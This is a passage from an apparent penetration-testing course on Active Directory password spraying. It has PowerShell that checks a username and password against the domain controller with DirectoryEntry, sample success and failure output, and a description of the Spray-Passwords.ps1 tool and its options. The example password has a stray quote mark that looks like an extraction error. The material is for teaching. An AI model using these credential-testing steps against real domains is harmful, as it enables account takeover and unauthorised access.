![](bbox=[0.13, 0.04, 0.3, 0.09])

There are a number of ways to test an AD user login, but we can use our PowerShell script to demonstrate the basic components. In previous sections, we performed queries against the domain controller as the logged-in user. However, we can also make queries in the context of a different user by setting the `DirectoryEntry` instance.

In previous examples, we used the `DirectoryEntry` constructor without arguments, but we can provide three arguments including the LDAP path to the domain controller as well as the username and the password:

```
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.',' ,DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwert"y891")
```
```

Listing 696 - Authenticating using DirectoryEntry

If the password for the user account is correct, the object creation will be successful as shown in Listing 697.

```
```text
distinguishedName : {DC=corp,DC=com}
Path                  : LDAP://DC01.corp.com/DC=corp,DC=com
```
```

Listing 697 - Successfully authenticated with DirectoryEntry

If the password is invalid, no object will be created and we will receive an exception as shown in Listing 698. Note the clear warning that the user name or password is incorrect.

```
```text
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect."
" + CategoryInfo : NotSpecified: (:) {format-default}, ExtendedTypeSystemException
+ FullyQualifiedErrorId : CatchFromBaseGetMember_Microsoft.PowerShell.Commands.Forma
```
```

Listing 698 - Incorrect password used with DirectoryEntry

In this manner, we can create a PowerShell script that enumerates all users and performs authentications according to the `Lockout Threshold` and `Lockout Observation window`.

An existing implementation of this attack called **Spray-Passwords.ps1**665 is located in the C:\Tools\active_directory folder of the Windows 10 client.

The -Pass option allows us to set a single password to test, or we can submit a wordlist file with -File. We can also test admin accounts with the addition of the -Admin flag.

> 665 (Imposec, 2016), https://github.com/ZlientJack/Spray-Passwords/blob/master/Spray-Passwords.ps1